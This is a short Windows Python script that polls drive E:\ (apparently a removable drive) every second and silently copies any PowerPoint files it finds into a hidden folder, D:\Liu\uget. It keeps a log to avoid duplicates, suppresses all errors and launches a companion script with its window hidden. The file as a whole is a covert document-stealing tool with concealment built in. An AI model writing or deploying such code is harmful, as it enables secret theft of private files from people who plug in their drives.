from finding import finding
import time
import shutil
import win32con
import win32api
import subprocess


def find():
    while True:
        try:
            with open("a", "r") as r:
                f = r.read().split("\n")
            finding_list = finding("E:\\")
            for i in finding_list:
                if ".ppt" in i and not i in f:
                    a = i.split("\\")[-1]
                    shutil.copyfile(i, f"D:\\Liu\\uget\\{a}")
                    with open("a", "a") as w:
                        w.write("\n"+i)
            time.sleep(1)
        except:
             pass
        

if __name__ == "__main__":
    subprocess.Popen(["python", "your_script.py"], startupinfo=subprocess.STARTUPINFO(dwFlags=subprocess.STARTF_USESHOWWINDOW, wShowWindow=subprocess.SW_HIDE))
    win32api.SetFileAttributes("D:\Liu", win32con.FILE_ATTRIBUTE_HIDDEN)
    find()
